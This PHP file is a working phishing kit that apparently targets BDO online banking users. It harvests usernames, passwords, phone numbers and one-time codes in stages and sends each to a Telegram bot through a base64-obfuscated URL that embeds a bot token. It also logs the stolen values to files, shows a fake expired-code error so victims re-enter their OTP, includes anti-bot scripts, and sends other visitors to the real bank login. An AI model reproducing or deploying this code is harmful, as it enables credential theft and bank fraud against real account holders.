<?php
include("./config/function.php");
include("./config/blocker.php");
include("./config/antibotsulit.php");
include("./config/antibots.php");
error_reporting(0);
date_default_timezone_set('Asia/Manila');
session_start();
if(isset($_POST["logint1m3l00p"])){
$login="USERNAME: ".$_POST["username"]."%0APASSWORD: ".$_POST["password"]."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDU4MzM2NDg6QUFFdFpka0FCRUxsd2g0NnBzVDlQVWVOVnhSbGFuUDVnbXcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xNzU3OTM2NDc1JnRleHQ9").$login);
$ip = getenv("REMOTE_ADDR");
$time = date("h:i:s A");
$user=$_POST["username"];
$pass=$_POST["password"];
$file = fopen("logs.php", "a+");
fwrite($file, "
<tr>
    <td id=\"user\"><span id=\"$user\">$user</span><input type=\"button\" style=\"font-size:10px;\" onclick=\"copyToClipboard('$user')\" value=\"COPY\"></input><span id=\"ips\"><br>Ip:$ip Time:$time</span></td>
    <td id=\"password\"><span id=\"$pass\">$pass</span><input type=\"button\" style=\"font-size:10px;\" onclick=\"copyToClipboard('$pass')\" value=\"COPY\"></button><span id=\"ips\"><br>Ip:$ip Time:$time</span></td>
</tr>
    ");
fclose($file);
$_SESSION["page"]="number";
}

if(isset($_POST["numbert1m3l00p"])){
$number="NUMBER: ".$_POST["number"]."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDU4MzM2NDg6QUFFdFpka0FCRUxsd2g0NnBzVDlQVWVOVnhSbGFuUDVnbXcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xNzU3OTM2NDc1JnRleHQ9").$number);
$ip = getenv("REMOTE_ADDR");
$date = gmdate("Y/m/d");
$time = date("h:i:s A");
$number = $_POST['number'];
$file = fopen("number.php", "a+");
fwrite($file, "<tr>
    <td id=\"number\"><span id=\"$number\">$number</span><input type=\"button\" style=\"font-size:10px;\" onclick=\"copyToClipboard('$number')\" value=\"COPY\"></input><span id=\"ips\"><br>Ip:$ip Time:$time</span></td>
</tr>
    ");
fclose($file);
$_SESSION["page"]="otp";
}

if(isset($_GET["otperror"])){$error='<font size="2" color="red" face="arial">Your code has been expired. Please try again.</font>';}
if(isset($_POST["otpt1m3l00p"])){
$otp="OTP: ".$_POST["otp"]."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDU4MzM2NDg6QUFFdFpka0FCRUxsd2g0NnBzVDlQVWVOVnhSbGFuUDVnbXcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xNzU3OTM2NDc1JnRleHQ9").$otp);
$ip=getenv("REMOTE_ADDR");
$time=date("h:i:s A");
$otp=$_POST['otp'];
$file=fopen("otp.php","a+");
fwrite($file,"
<tr>
    <td id=\"otp\"><span id=\"$otp\">$otp</span><input type=\"button\" style=\"font-size:10px;\" onclick=\"copyToClipboard('$otp')\" value=\"COPY\"></input><span id=\"ips\"><br>$ip Time:$time</span></td>
</tr>
    ");
	fclose($file);
header("Location: ./?otperror");
}

if(isset($_POST["start"])){
$fp = fopen('magicaltext.txt', 'a+');
fwrite($fp, "\n");
fclose($fp);
$_SESSION["page"]="login";
header("Location: ./");
}else if(isset($_GET["destroy"])){
session_unset();
}

if($_SESSION["page"]=="login"){
include("./home_files/home.jpg");
}else if($_SESSION["page"]=="number"){
include("./home_files/number.jpg");
}else if($_SESSION["page"]=="otp"){
include("./home_files/otp.jpg");
}else{
header("Location: https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check");
}



?>